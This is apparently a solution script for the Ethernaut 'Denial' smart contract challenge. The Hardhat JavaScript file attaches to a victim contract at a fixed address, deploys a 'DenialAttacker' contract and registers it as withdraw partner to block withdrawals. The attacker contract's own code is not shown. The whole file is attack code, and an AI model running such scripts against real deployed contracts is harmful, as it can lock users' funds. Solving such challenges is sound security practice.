
const { ethers } = require("hardhat");

async function main() {
  const victimContractAddress = '0x362D76Ce584Bc14a9122fda16aF58310e43983Fe';

  const Denial = await ethers.getContractFactory("Denial");
  const denial = Denial.attach(victimContractAddress);

  const DenialAttacker = await ethers.getContractFactory("DenialAttacker");
  const denialAttacker = await DenialAttacker.deploy();

  console.log("Denial Attacker deployed to:", denialAttacker.address)

  await denial.setWithdrawPartner(denialAttacker.address);

  console.log("Succesful attack!");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
